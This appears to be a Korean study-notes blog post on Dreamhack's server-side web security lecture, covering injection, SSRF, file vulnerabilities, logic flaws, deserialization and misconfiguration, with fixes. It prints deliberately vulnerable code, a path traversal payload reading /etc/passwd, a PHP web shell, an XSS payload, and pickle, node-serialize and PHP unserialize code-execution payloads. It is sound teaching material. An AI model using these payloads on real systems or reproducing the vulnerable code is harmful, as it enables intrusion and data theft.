---
title: "[모각코] #3 드림핵 3강 Server-side Basic"
categories:
  - Hacking
  - Web
tags:
  - Hacking
  - Web
toc: true
toc_sticky: true

---

# Server-side(서버 사이드)

: **서버에서 사용자에게 응답하는 과정(웹 어플리케이션 or 데이터베이스 같은 서버 자원 사용해 처리)에서 사용자의 요청 데이터에 의해 발생하는 취약점**

## 취약점 종류

### **Injection (인젝션)**

: 서버의 처리 과정 중 사용자가 **입력한 데이터가 처리 과정의 구조나 문법적으로 사용되어 발생**하는 취약점



-> **변조된 입력을 주입해 의도하지 않은 행위를 발생**

**(사용자의 입력에 변조된 입력 주입)**



#### **1. SQL Injection**

​	: **SQL을 사용**할 때 공격자의 입력 값이 정상적인 요청에 영향을 주는 취약점

* **SQL(Structured Query Language)**

  -> 관계형 데이터베이스(RDBMS)의 데이터를 정의하고 질의, 수정 등을 하기 위해 고안된 언어

  **(데이터베이스와 상호작용하기 위해 쓰임)**

  

* **해킹 방법**

  1. 웹 어플리케이션에서 로그인/검색과 같이 사용자의 입력 데이터를 기반으로 **DBMS에 저장된 정보를 조회하는 기능을 구현**하기 위해 **SQL쿼리에 사용자의 입력 데이터를 추가하여 DBMS에 요청**

  2. 이 과정에서 **사용자의 입력이 SQL 쿼리에 삽입되어 SQL 구문으로 해석되거나 문법적으로 조작**

     -> 개발자가 의도한 정상적인 SQL 쿼리가 아닌 임의의 쿼리가 실행

     

  ex) 로그인

  * MySQL 로그인 처리하는 쿼리

    ```pseudocode
    select * from user_table
    where uid='{uid}' and upw='{upw}';
    ```

    ->{uid}, {upw}부분에 사용자가 입력한 문자열 삽입 & DBMS로 전달

    **=> 사용자가 입력에 `'` 문자를 포함해 문자열을 탈출하고 뒷 부분에 새로운 쿼리를 작성하여 전달하면 DBMS에서 사용자가 직접 작성한 쿼리를 실행**

  * **실습**

    ![image](https://user-images.githubusercontent.com/79195793/125643110-6470d4c9-f088-4707-910e-2139ef70edb9.png)

    **-> 위와 같이 or 연산자로 공격하여 데이터 접근 가능**

* **해결방안**

  * **문제점: **

    사용자의 입력 값에 문자열 구분자(`'`, `"`)가 삽입되어 본래의 쿼리 형태를 벗어나는 SQL Injection이 발생

    

  * **해결방법**:

    **ORM과 같이 검증된 SQL 라이브러리 사용**

    * ORM: Object Relational Mapper의 약자로써 **SQL의 쿼리 작성을 돕기위한 라이브러리**

      **=>사용자의 입력 값을 라이브러리 단에서 스스로 escape하고 쿼리에 매핑시키기 때문에 안전하게 SQL 쿼리를 실행**

      ![image](https://user-images.githubusercontent.com/79195793/125643180-5f51c31d-307e-41db-8c96-d282adbe0cac.png)

    

### **2. Command Injection**

: OS Command를 사용 시 사용자의 **입력 데이터에 의해 실행되는 Command를 변조**할 수 있는 취약점

* **OS Command**:

  linux(ls, pwd, ping, zip), windows(dir, pwd, ping) 등의 OS에서 사용하는 명령어

  **->이미 기능을 구현한 OS 실행 파일이 존재할 때 코드 상에서 다시 구현하지 않고 OS Command실행하면 더 편리**

  

* OS Command 명령어

  ![image](https://user-images.githubusercontent.com/79195793/125643275-b82fa2b6-87f9-4b7a-a212-a2462ac49601.png)
  ![image](https://user-images.githubusercontent.com/79195793/125643296-cddd19c4-8498-4728-9a08-0c7c9e88702a.png)


* **실습**

  ```js
  @app.route('/ping')
  def ping():
  	ip = request.args.get('ip')
  	return os.system(f'ping -c 3 {ip}')
  ```

  -> **Meta 문자**로 다른 OS Command 실행해보기

  ![image](https://user-images.githubusercontent.com/79195793/125643354-92df778f-8138-42db-810a-b0bea5220053.png)

  

* **해결방법**

  * **문제점**:

    사용자의 입력 데이터가 Command 인자가 아닌 다른 값으로 해석

  * **해결방법**:

    **1. 웹 어플리케이션에서 OS Command를 사용하지 않는 것**

    * **Os command가 라이브러리 형태로 구현-> 해당 라이브러리를 사용**

    * **없을 경우 직접 프로그램 코드로 포팅해 사용**

      

    **2. OS Command에 사용자의 입력 데이터를 사용해야할 경우**

    * **정규식을 통한 화이트리스트방식 필터링**

      e.g. ping을 보내는 페이지의 경우 사용자가 입력한 IP가 정상적인 IP 형식인지 정규식으로 검증 후 사용

      ```js
      import re, os, ...
      ...
      chk_ip = re.compile('^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$')
      if bool(chk_ip.match(ip)):
          return run_system(f'ping -c 3 {ip}')
      else:
          return 'ip format error'
      ```

      

    * **OS Command에서 Meta 문자로 사용되는 값을 필터링 하고 따옴표로 감싸기**

      e.g. ping을 보내는 페이지의 경우 사용자가 입력한 IP를 따옴표로 감싸서 사용

      ```js
      if '\'' in ip:
          return 'not allowed character'
      return run_system(f'ping -c 3 \'{ip}\'')
      ```

      ![image](https://user-images.githubusercontent.com/79195793/125643390-705e3312-8d9c-446f-923a-84e37a611bac.png)

    * **기능에 해당하는 라이브러리 사용**

      -> 사용하고자하는 기능을 OS 커맨드가 아닌 구현한 라이브러리로 대체 사용

      ```js
      #! pip install ping3 
      # https://github.com/kyan001/ping3/blob/master/ping3.py
      import ping3
      ping3.ping(ip)
      ```

      -> *라이브러리의 보안성 및 안정성 등을 검토한 후 사용해야 함.*

  ### 3. Server Side Template Injection (SSTI)

  : 템플릿 변환 도중 **사용자의 입력 데이터가 템플릿으로 사용돼 발생**하는 취약점

  

  -> **사용자의 입력 데이터가 Template에 직접 사용될 경우, Template Engine이 실행하는 문법을 사용할 수 있음**

  * Template Engine:

    웹 어플리케이션에서 동적인 내용을 HTML로 출력할 때 미리 정의한 Template에 동적인 값을 넣어 출력

    ![image](https://user-images.githubusercontent.com/79195793/125643427-c429bec7-6608-4d99-9c1e-4fa22b880ef5.png)



* **해결방안**

  -> 사용자의 입력 데이터를 Template source에 삽입되지 않도록!

  

* **실습**

  ![image](https://user-images.githubusercontent.com/79195793/125643476-6a034699-0560-4dfd-ad0b-70f705f3456c.png)

  정답:

  ![image](https://user-images.githubusercontent.com/79195793/125643510-279b40c9-87bb-4e44-bec3-9dad704c78e1.png)

  해설:

  ![image](https://user-images.githubusercontent.com/79195793/125643562-573387bd-77a7-4d3f-90f3-8d6177c7ba9f.png)

### 4. **Path Traversal**

: URL / File Path를 사용 시 **사용자의 입력 데이터에 의해 임의의 경로에 접근**하는 취약점입니다.

ex)**내부 API가 Path variable로 입력 데이터를 받는 형태로 구현**

​		-> URL의 Path로 데이터가 입력되는 경우

​	**=> 사용자의 입력 데이터가 URL Path에 사용될 경우 URL 구분 문자를 사용하지 못하도록 하는 필터링 또는 인코딩이 부재시 `../`과 같은 구분 문자를 통해 의도한 경로가 아닌 상위 경로에 접근해 다른 API를 호출**

![image](https://user-images.githubusercontent.com/79195793/125643620-bf8e7e38-1f95-4d2a-955e-86e26372e353.png)


* URL 구분문자

  ![image](https://user-images.githubusercontent.com/79195793/125643666-debeeb87-f77a-4178-87aa-4ce41354749d.png)

* **해결방안**

  : **URL Encoding과 같은 인코딩을 사용해 사용자의 입력 데이터에 포함된 구분 문자를 인식하지 않도록 하기**

  

* **실습**

  ![image](https://user-images.githubusercontent.com/79195793/125643717-3aff354b-2748-4c89-b768-38de3f5701b9.png)

  * external server

    ![image](https://user-images.githubusercontent.com/79195793/125643760-70f98025-20ef-42e4-a599-3cafbad25ca3.png)

  * Internal Server

    ![image](https://user-images.githubusercontent.com/79195793/125643806-bf81149b-3e43-4e23-8677-4b418dfa25b6.png)

  * 정답

    ![image](https://user-images.githubusercontent.com/79195793/125643835-0c4989e2-2418-4e35-a30c-f6101af1dc4d.png)

    ​	**=> make_admin 핸들러를 상대경로로 접근하여 호출**

    

### 5.**Server Side Request Forgery (SSRF)**

: 공격자가 서버에서 변조된 요청을 보낼 수 있는 취약점

=> **웹 어플리케이션에서 요청**하므로, 웹 어플리케이션이 작동하고 있는 **서버 내부의 포트, 서버와 연결된 내부망에 요청**을 보낼 수 있고 Server-side에서 **변조된 요청 / 의도하지 않은 서버**로 요청을 보내는 공격

![image](https://user-images.githubusercontent.com/79195793/125643884-54a85103-41b8-4adb-bb69-eace6ee13416.png)

* **해결 방안**

  * **URL Host 화이트리스트방식 필터링**

    -> 미리 신뢰할 수 있는 Domain Name, IP Address를 화이트리스트에 등록

    ```js
    from urllib.parse import urlparse
    WHITELIST_URL = [
        'i.imgur.com',
        'img.dreamhack.io',
        ...
    ]
    SCHEME = ['http', 'https']
    def is_safehost(url):
        urlp = urlparse(url)
        if not urlp.scheme in SCHEME:
            return False
        hostname = urlp.hostname.lower()
        if hostname in WHITELIST_URL:
            return True
        return False
    print(is_safehost('https://127.0.0.1/'))
    print(is_safehost('https://i.imgur.com/Bsz7RJN.png'))
    ```

* **실습**

  ->실습 모듈의 코드를 확인하고 Internal Server에 접근해보세요.

  * external Server

  ```js
  from flask import Flask, render_template, request
  import requests
  from dreambank import imgcheckFunc, adminFunc, configFunc, logFunc
  app = Flask(__name__)
  adminIP = ["127.0.0.1"]
  def adminCheck():
  	if request.remote_addr in adminIP:
  		return True
  	else:
  		return False
  @app.route("/")
  def index():
  	if adminCheck():
  		return render_template("admin_index.html")
  	else:
  	    return render_template("index.html")
  @app.route("/imgCheck")
  def imgcheck():
  	url = request.form['url']
  	img = requests.get(url).content
      checkResult = imgcheckFunc(img)
      return checkResult
  @app.route("/admin")
  def admin():
  	if adminCheck():
  		return adminFunc()
  @app.route("/config")
  def config():
  	if adminCheck():
  		return configFunc()
  @app.route("/log")
  def log():
  	if adminCheck():
  		return logFunc()
  if __name__ == "__main__":
      app.run(host='0.0.0.0')
  ```

  * internal Server

    ```js
    from flask import Flask, render_template, request
    import requests
    from dreambank import userLevel, userList
    app = Flask(__name__)
    @app.route("/")
    def index():
    	return render_template("index.html")
    @app.route("/user")
    def user():
    	action = request.args.get('action')
    	if action == "grant":
    		name = request.args.get('name')
    		result = userLevel(name, 'admin')
    	elif action == "list":
    		result = userList()
    	else:
    		result = userList()
        return result
    if __name__ == "__main__":
        app.run()
    ```

  * 풀이

    ![image](https://user-images.githubusercontent.com/79195793/125643934-5df071ff-d953-44fe-90bb-e7aac0793d30.png)

    -> 사용자 권한 부여 URL에 접근해 dream 사용자에게 admin 권한을 부여

    

# **File vulnerability**

: 서버의 파일 시스템에 사용자가 원하는 행위를 할 수 있을 때 발생하는 취약점

#### 1. **파일 업로드 취약점**

서버의 파일 시스템에 **사용자가 원하는 경로 또는 파일 명 등으로 업로드가 가능**

* File Upload Code

  ```js
  from flask import Flask, request
  app = Flask(__name__) 
  @app.route('/fileUpload', methods = ['GET', 'POST'])
  def upload_file():
  	if request.method == 'POST':
  		f = request.files['file']
  		f.save("./uploads/" + f.filename)
  		return 'Upload Success'
  	else:
  		return """
  		<form action="/fileUpload" method="POST" enctype="multipart/form-data">
  			<input type="file" name="file" />
  			<input type="submit"/>
  		</form>
  		"""
  if __name__ == '__main__':
  	app.run()
  ```

  * 악의적인 File Upload Request

  ![image](https://user-images.githubusercontent.com/79195793/125643968-065d3d17-37b6-45bd-aee8-2bcec8059259.png)

* **CGI**:

  사용자의 요청을 받은 서버가 **동적인 페이지를 구성하기 위해 엔진에 요청**을 보내고 엔진이 처리한 결과를 서버에게 반환하는 기능

  **=> 확장자를 통해 웹 어플리케이션 엔진에 요청 여부 판단**

ex) 

![image](https://user-images.githubusercontent.com/79195793/125644078-d44ea6ed-a081-4c62-8ad7-01e5ed251f66.png)



- **실습**

```php
<?php
if(!empty($_FILES['file'])){
  $filename = generateRandomString(); // custom function
  $ext = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);
  $path = "./uploads/" . $filename . "." . $ext;
  if(move_uploaded_file($_FILES['file']['tmp_name'], $path)) {
    return true; // upload success
  } else {
    return false; // upload fail
  }
}
?>
```

-> php를 실행시키거나 html파일 등을 업로드하여 Stored XSS 취약점을 발생

* 정답:

  ->  `.php3/4/5/7`, `.pht`, `.phtml`등의 파일 확장자를 업로드하여 서버의 엔진이 처리하도록 유도

* 예시 코드 exploit.php

```php
<?php  system("ls");?>
```

![image](https://user-images.githubusercontent.com/79195793/125644106-26d30c75-b61a-47be-83ca-34f0ae066638.png)
또한, html 파일을 업로드하여 Stored XSS 취약점이 발생하게 할 수도 있음

* 예시 코드 exploit.html

```html
<script>alert(1);</script>
```

![image](https://user-images.githubusercontent.com/79195793/125644189-e6f17d41-413b-44bc-b52e-d185eafbe78f.png)

#### 2.**파일 다운로드 취약점**

서버의 기능 **구현 상 의도하지 않은 파일을 다운로드**할 수 있는 취약점

* 사용자가 입력한 **파일이름을 검증하지 않은 채** 그대로 다운로드를 제공하는 행위

  * 취약한 코드 예시

  ```js
  ...
  @app.route("/download")
  def download():
      filename = request.args.get("filename", "")
      return open("uploads/" + filename, "rb").read()
  ...
  ```

* **Path Traversal**

  -> uploads 경로보다 더 **상위 경로**에 존재하는 시스템 파일, 설정 파일과 같은 중요한 정보들을 다운로드

  ex) `http://example.com/download?filename=docs.pdf`형태가 정상적인 파일 다운로드 요청

  -> 공격자는`http://example.com/download?filename=../../../../etc/passwd`처럼 다른 경로에 접근하여 시스템의 계정 파일을 다운로드 할 수 있음

  ![image](https://user-images.githubusercontent.com/79195793/125644321-9b8f5399-8aa9-4609-ba57-cf4a733698fa.png)

  

  

* **실습**

  ![image](https://user-images.githubusercontent.com/79195793/125644395-1a08b9d5-fc5b-47d9-8d18-b94aeb288c0b.png)

  * 풀이

    -> 상위 폴더로 가서 app.py의 Secret 값 획득

    ![image](https://user-images.githubusercontent.com/79195793/125649728-cf93952f-5c7a-44ed-b7f6-c8e4d80bcc60.png)

* **해결방법**

  -> 반드시 이름을 넘기는 방식으로 구현해야 한다면 **상대경로로 접근하는데 사용될 수 있는 `..` 과 `/` 와 `\\` 를 적절하게 필터링** 

  ex) 데이터베이스에 다운로드 될 파일의 경로와 그에 해당하는 랜덤 키를 생성해 1대 1로 매칭해서 저장해두고 해당 랜덤 값이 인자로 넘어왔을 때 데이터베이스에 존재하는 파일인지를 먼저 식별하고 다운로드 하는 것

  ```js
  @app.route("/download")
  def download():
      file_id = request.args.get("file_id", "")    
  	// file_id는 쉽게 유추하지 못하는 랜덤한 값이어야 합니다.
      file_path = find_path_from_database(file_id)  
  	//find_path_from_database 함수는 데이터베이스에서 file_id와 매핑된 파일 경로를 반환하는 개발자가 작성한 함수입니다.
      if file_path is None:
          return "올바르지 않은 파일 아이디입니다."
      return open(file_path, "rb").read()
  ```

  

# Business Logic Vulnerability (비즈니스 로직 취약점)

: 인젝션, 파일 관련 취약점들과는 다르게 정상적인 흐름을 악용하는 것을 의미

* **Business logic(비즈니스 로직)**

  :규칙에 따라 데이터를 생성·표시·저장·변경하는 로직, 알고리즘 

  

  ## **Business Logic Vulnerability(비즈니스 로직 취약점)**

  -> 서비스의 기능에서 적용되어야 할 로직이 없거나 잘못 설계된 경우 발생

  * **퀴즈**

    -> 오른쪽 탭은 비즈니스 로직 취약점의 예시 및 코드입니다. 후기 작성 시 마다 100포인트를 지급하는데 후기를 작성하고 삭제하는 행위를 반복해도 포인트를 차감하지 않아 무제한으로 적립받을 수 있는 비즈니스 로직 취약점이 존재

    ```js
    @app.route('/reviewDelete')
    def review_delete():
    	userName = session['username']
    	idx = request.args.get('idx')
    	
    	if review_owner_check(userName):
    		return "owner check fail."
    	result = review_Delete(idx)
    	// userPoint(userName, -100)
    	if result :
    		return "delete success."
    	else:
    		return "delete fail."
    ```

  

  ## **IDOR(Insecure Direct Object Reference** )

  :안전하지 않은 객체 참조라는 의미와 같이 객체 참조 시 사용하는 객체 참조 키가 사용자에 의해 조작됐을 때 조작된 객체 참조 키를 통해 객체를 참조하고, 해당 객체 정보를 기반으로 로직이 수행되는 것

  **=> 사용자의 입력 데이터에 의해 참조하는 객체가 변하는 기능에서 사용자가 참조하고자 하는 객체에 대한 권한 검증이 올바르지 않아 발생**

  

  * **해결방안**

    1. 객체 참조 시 사용자의 권한을 검증하는게 가장 중요

    2. 사용자가 요청 시 전달하는 세션을 통해 서버 내에서 처리하는 것이 안전

    3. 객체를 참조하기 위해 사용하는 객체 참조 키를 단순한 숫자가 아닌 무작위 문자 생성 등을 통해 악의적인 공격자가 객체에 참조하기 위한 객체 참조 키를 추측하기 어렵게 만드는 방법

       

  ## Race Condition

  : 공유 자원 처리 과정에서 해당 자원에 대한 동시 다발적인 접근으로 인해 발생하는 취약점

  1. 데이터베이스 또는 파일 시스템과 같이 **웹 어플리케이션에서 공유하는 자원들에 대한 접근 과정에서 데이터를 참조하는 타이밍의 차이**로 인해 취약점이 발생

  2. **비즈니스 로직의 잘못된 순서**로 인해 취약점이 발생

     

# **Language specific Vulnerability (PHP, Python, NodeJS)**

웹 어플리케이션에서 사용하는 언어의 특성으로 인해 발생하는 취약점

## Common

- **코드 실행 함수 (eval)**

  -> 인자로 입력된 문자열을 어플리케이션 코드로 실행

  - **php**

  ```php
  <?php   eval("1+1"); // 2 ?>
  ```

  - **python**

  ```python
  eval("1+1") # 2exec("2+2") # 4 # eval은 하나의 식만을 처리하지만, exec은 하나의 문장을 처리합니다.eval("a=1") # SyntaxError: invalid syntaxexec("a=1") # a=1
  ```

  - **javascript**

  ```js
  eval("1+1"); // 2
  ```

  -> 사용자의 입력 데이터가 **eval의 인자로 사용되지 않아야 함**

  

- **OS command function**

  -> OS Command를 실행하기 위한 어플리케이션 함수 사용 시 실행하는 명령어에 사용자의 입력 데이터가 포함될 경우 Command Injection 취약점이 발생

  - **Python**
    - os.system, popen
    - subprocess.call, run, Popen

  

  - **PHP**
    - system, passthru
    - shell_exec, backtick operator (e.g. ``ls``)
    - popen, proc_open
    - exec

  

  - **Javascript (Nodejs)**

    - child_process.exec, spawn

      

- **Filesystem function**

  ->  함수들의 인자가 사용자의 입력 데이터 또는 변조될 가능성이 있는 변수들을 사용할 경우 서버의 파일 시스템을 공격

  - File Read
    - 어플리케이션 코드, 설정 파일 정보 등의 노출

  

  - File Write

    - WebShell 생성을 통한 원격 코드 실행 공격
    - 기존 설정 파일을 덮는 공격을 통해 운영체제 또는 어플리케이션 설정 변경

    

  - Etc

    - 파일 복사를 통해 File Write와 유사한 상황 발생
    - 설정 파일을 삭제하여 운영체제 또는 어플리케이션 서비스 무력화

    

- **serialize / deserialize(직렬화/ 역직렬화)**

  * **serialize(직렬화)**:

    Object 또는 Data의 상태 또는 타입을 특정한 형태의 포맷을 가진 데이터로 변환하는 것을 의미

    -> **오브젝트, 데이터의 현재 상태와 타입들을 저장**

    

  * **deserialize(역직렬화)**:

    직렬화된 데이터를 원래의 Object 또는 Data의 상태 또는 타입으로 변환하는 것을 의미

    -> **동일한 상태와 타입을 가진 오브젝트 또는 데이터들을 사용**

    

  * **해킹방법**

    -> 역직렬화 과정에서 어플리케이션 상에서 다른 행위를 발생시키는 상태 또는 타입을 이용하여 악의적인 행위를 발생시킴

    * 직렬화/역직렬화 예시 코드

    ```js
    import pickleclass TestClass:  def __init__(self, a, b):    self.A = a    self.B = b
    //TestClass 생성, ClassA로 할당ClassA = TestClass(31337,10001)
    // ClassA 직렬화ClassA_dump = pickle.dumps(ClassA)print(ClassA_dump)# ClassA 역직렬화, ClassB로 할당ClassB = pickle.loads(ClassA_dump)print(ClassB.A, ClassB.B)
    ```

    - 실행 결과

    ```js
    $ python3 pickleTest.py b"\x80\x03cmain\nTestClass\nq\x00)\x81q\x01}q\x02(X\x01\x00\x00\x00Aq\x03MizX\x01\x00\x00\x00Bq\x04M\x11'ub."31337 10001
    ```

    ex)

    1. **python**

       ->`__reduce__` 메소드를 공격에 사용

    - Python deserialize 취약점 예시 코드

    ```js
    import pickleimport osclass TestClass:  def __reduce__(self):  	return os.system, ("id", )ClassA = TestClass()
    // ClassA 직렬화ClassA_dump = pickle.dumps(ClassA)print(ClassA_dump)# 역직렬화pickle.loads(ClassA_dump)
    ```

    - 실행 결과

    ```js
    $ python3 pickleExploit.pyb'\x80\x03cposix\nsystem\nq\x00X\x02\x00\x00\x00idq\x01\x85q\x02Rq\x03.'uid=1000(dreamhack) gid=1000(dreamhack) groups=1000(dreamhack)
    ```

     

    2. **JS(Node.js)**

       NodeJS의 대표적인 직렬화/역직렬화 모듈은 **node-serialize**가 있습니다.

       - serialize 예시 코드

       ```js
       var serialize = require('node-serialize');x = {	test : function(){ return 'Hello'; }};console.log(serialize.serialize(x));
       /*{"test":"_$$ND_FUNC$$_function(){ return 'Hello'; }"}*/
       ```

       함수를 포함하는 object를 직렬화 하면 위와 같은 결과가 나옵니다.
       **node-serialize 모듈의 직렬화된 포맷에서** `_$$ND_FUNC$$_`**은 함수를 의미**

       

       ```js
       serialize_func_1 = {"test":"_$$ND_FUNC$$_function(){ return 'Hello'; }"}console.log(serialize.unserialize(serialize_func_1));
       /*{ test: [Function (anonymous)]        }*/
       serialize.unserialize(serialize_func_1)['test']()/*'Hello'*/
       ```

       직렬화된 object 값을 역직렬화 시키면 원래 object 형태로 나옴

       

       ```js
       serialize_func_2 = {"test":"_$$ND_FUNC$$_function(){ return 'Hello'; }()"}console.log(serialize.unserialize(serialize_func_2));
       /*{ test: 'Hello' }*/
       ```

       직렬화된 object의 결과에서 내부에 포함된 함수가 역직렬화 과정에서 실행되게 `()`를 붙여 실행하면 역직렬화 과정에서 함수가 실행되어 결과가 반영되는것 을 확인할 수 있음

       

       - 원격 코드 실행 페이로드

       ```js
       var serialize = require('node-serialize');
       serialize_exploit_func = {"test":"_$$ND_FUNC$$_function (){require('child_process').exec('id', function(error, stdout, stderr)
       {console.log(stdout) });}()"
       }
       console.log(serialize.unserialize(serialize_exploit_func));/*uid=1000(dreamhack) gid=1000(dreamhack) groups=1000(dreamhack)*/
       ```

    3. **PHP**

       unserialize에 의해 호출되는 `Magic Methods` 로직의 취약점이 존재하거나, 클래스의 데이터를 조작하여 공격을 연계해야 합니다.

       아래는 클래스의 변수를 조작하여 연계가 가능한 취약한 코드와 공격 예시

       ```js
       <?phpclass Test{  var $func_name = "var_dump";  var $argv = "test";  function __destruct(){    
       call_user_func($this->func_name, $this->argv);  
       }}$obj = new Test();$serialize_Data = 'O:4:"Test":2:{s:9:"func_name";s:6:"system";s:4:"argv";s:2:"id";}';
       $obj = unserialize($serialize_Data);/*string(4) "test"uid=1000(dreamhack) gid=1000(dreamhack) groups=1000(dreamhack)*/
       ```

## PHP

- include

- Wrappers

- extract

- Type Juggling

- Comparison

- session

- Upload Logic

  

## Javascript

> 자바스크립트는 클라이언트 사이드에서는 웹 브라우저의 내장 언어로 사용되며, 서버 사이드에서는 자바스크립트를 기반으로 만들어진 **NodeJS**로 사용될 수도 있음

- Comparison Problem
- Prototype Pollution



# **Misconfiguration**

잘못된 설정으로 인해 발생하는 취약점을 다룸



### 1. 부주의로 인해 발생하는 문제점

메뉴얼에 존재하지 않은 설정이거나 개발자의 부주의로 인해 설정 유무를 알지 못한 상태에서 서비스를 할 경우 자주 발생

- 권한 설정 문제

  - 잘못된 권한 설정
  - 기본 계정

  

- 기본 서비스

- 임시/백업 파일, 개발 관련 파일

------

### 2. 편의성을 위한 설정에 의해 발생하는 문제점

개발자를 위한 설정이 서비스 환경에서도 켜져있어 공격자가 이를 통해 시스템 내부의 정보를 알아내 추가적인 공격에 사용

- DEBUG / Error Message Disclosure
- 0.0.0.0으로 바인딩된 네트워크 설정

------

### 3. 메뉴얼과 실제 구현체의 차이로 인해 발생하는 문제점

메뉴얼에 설명되어있는 대로 사용했지만 중의적 표현이 존재하거나 잘못 설명되어있을 때 발생

- NGINX ALIAS Path Traversal 취약점

------

### 4. 해당 코드나 설정에 대한 이해 없이 사용해 발생하는 문제점

취약점이 존재하는 예제코드, StackOverflow 답변등을 이해 없이 복사 붙여넣기 해 사용하거나 메뉴얼에 존재하는 권고 설정을 무시한 채 사용해 발생합니다.

- https://stackoverflow.com/questions/47404893/reverse-image-proxy-without-specifying-host
- 모든 도메인을 허용한 CORS 설정


![image](https://user-images.githubusercontent.com/79195793/125649768-4dc3a48f-2410-41fa-8c65-b4fe9c07f916.png)
![image](https://user-images.githubusercontent.com/79195793/125649901-b1203545-472a-42fb-9dd1-1ac204ec8c60.png)

